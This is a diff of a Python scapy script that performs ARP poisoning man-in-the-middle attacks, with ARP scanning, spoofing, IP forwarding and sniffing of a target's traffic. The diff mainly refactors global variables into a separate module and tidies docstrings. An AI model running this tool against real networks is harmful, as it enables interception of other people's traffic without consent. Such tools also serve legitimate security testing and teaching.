@@ -1,19 +1,15 @@
-import logging
-import argparse
-import sys
-import time
-import platform
 from scapy.all import *
+from sys import exit, stdout
 from threading import Thread
 
+import logging
+import argparse
+import time
+import platform
+
+import globals
+
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-
-MY_MAC = ""
-MY_IP = ""
-
-GATEWAY_MAC = ""
-_SRC_DST = {}
-STOP_SNIFF = False
 
 
 def arp_scan(ip, interface):
@@ -55,6 +51,7 @@ def arp_spoof(targetIP, spoofIP, spoofMAC):
 def arp_restore(destinationIP, sourceIP, destinationMAC, sourceMAC):
     """
     Restores the ARP cache after an ARP spoofing attack.
+
     Args:
         destinationIP (str): The target IP address.
         sourceIP (str): The IP address of the original host to be restored.
@@ -68,14 +65,17 @@ def arp_restore(destinationIP, sourceIP, destinationMAC, sourceMAC):
 def set_ip_forwarding(is_enabled):
     """
     Enables IP forwarding through system commands depending on the OS
-    :param is_enabled:
-    :return:
+
+    Args:
+        is_enabled (bool): True if enable, False otherwise.
     """
     is_enabled = int(is_enabled)
     platform_name = platform.system()
+
     if platform_name == "Linux":
         # Linux
         os.system('echo {} > /proc/sys/net/ipv4/ip_forward'.format(is_enabled))
+
     elif platform_name == "Darwin":
         # OSX
         os.system('sysctl -w net.inet.ip.forwarding={}'.format(is_enabled))
@@ -88,7 +88,7 @@ def sniff_parser(packet):
 
 
 def sniffer_thread(callback, filter, iface):
-    while not STOP_SNIFF:
+    while not globals.STOP_SNIFF:
         sniff(
             prn=callback,
             filter=filter,
@@ -98,7 +98,6 @@ def sniffer_thread(callback, filter, iface):
 
 
 def arp_mitm(targetIP, gatewayIP, targetMAC, gatewayMAC, myMAC, callback, filter, iface):
-    global STOP_SNIFF
 
     packets = 0
 
@@ -127,7 +126,7 @@ def arp_mitm(targetIP, gatewayIP, targetMAC, gatewayMAC, myMAC, callback, filter
             packets += 2
             if packets % 10 == 0:
                 print("\r[+] Sent packets " + str(packets)),
-            sys.stdout.flush()
+            stdout.flush()
             time.sleep(2)
 
     except KeyboardInterrupt:
@@ -141,12 +140,11 @@ def arp_mitm(targetIP, gatewayIP, targetMAC, gatewayMAC, myMAC, callback, filter
         set_ip_forwarding(0)
 
         print("[+] Stopping Packet Sniff.")
-        STOP_SNIFF = True
+        globals.STOP_SNIFF = True
         sniffer.join()
 
 
 def main():
-    global GATEWAY_MAC, _SRC_DST, MY_MAC, MY_IP
 
     parser = argparse.ArgumentParser()
 
@@ -177,10 +175,10 @@ def main():
 
     args = parser.parse_args()
 
-    MY_MAC = get_if_hwaddr(args.interface)
-    MY_IP = get_if_addr(args.interface)
+    globals.MY_MAC = get_if_hwaddr(args.interface)
+    globals.MY_IP = get_if_addr(args.interface)
 
-    print(f"My MAC: {MY_MAC}\nMy IP: {MY_IP}")
+    print(f"My MAC: {globals.MY_MAC}\nMy IP: {globals.MY_IP}")
     print()
 
     if args.command == 'discover':
@@ -198,27 +196,27 @@ def main():
         result = arp_scan(args.target, args.interface)
         if not result:
             print("\tCannot determine target MAC address. Are you sure the IP is correct?")
-            sys.exit(1)
+            exit(1)
         else:
             targetMAC = result[0]['MAC']
 
         result = arp_scan(args.gateway, args.interface)
         if not result:
             print("\tCannot determine gateway MAC address. Are you sure the IP is correct?")
-            sys.exit(1)
+            exit(1)
         else:
             gatewayMAC = result[0]['MAC']
 
         # Define packet forwarding source and destination
-        GATEWAY_MAC = gatewayMAC
-        _SRC_DST = {
+        globals.GATEWAY_MAC = gatewayMAC
+        globals._SRC_DST = {
             gatewayMAC: targetMAC,
             targetMAC: gatewayMAC,
         }
 
         print(f"[+] Performing ARP poisoning MITM.")
         filter = f"ip and (ether src {targetMAC} or ether src {gatewayMAC})"
-        arp_mitm(args.target, args.gateway, targetMAC, gatewayMAC, MY_MAC, sniff_parser, filter, args.interface)
+        arp_mitm(args.target, args.gateway, targetMAC, gatewayMAC, globals.MY_MAC, sniff_parser, filter, args.interface)
 
 
 if __name__ == '__main__':
